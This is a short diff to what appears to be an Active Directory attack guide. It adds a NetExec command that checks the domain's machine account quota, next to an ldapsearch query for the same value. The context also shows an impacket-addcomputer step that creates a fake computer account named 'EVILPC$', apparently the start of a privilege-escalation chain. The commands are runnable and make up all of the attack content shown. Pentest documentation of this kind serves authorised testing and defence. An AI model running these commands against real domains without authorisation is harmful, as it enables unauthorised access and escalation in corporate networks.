@@ -127,6 +127,9 @@ Admin.
 ldapsearch -x -H ldap://$DC_IP -D "$USER@$DOMAIN" -w "$PASS" \
     -b 'DC=corp,DC=local' '(objectClass=domain)' ms-DS-MachineAccountQuota
 
+[OR]
+nxc ldap $DC_IP -M maq -u $USER -p $PASS
+
 # Step 2 — Create a fake computer account
 impacket-addcomputer $DOMAIN/$USER:$PASS -dc-ip $DC_IP -computer-name 'EVILPC$' -computer-pass 'EvilPass123!'
 
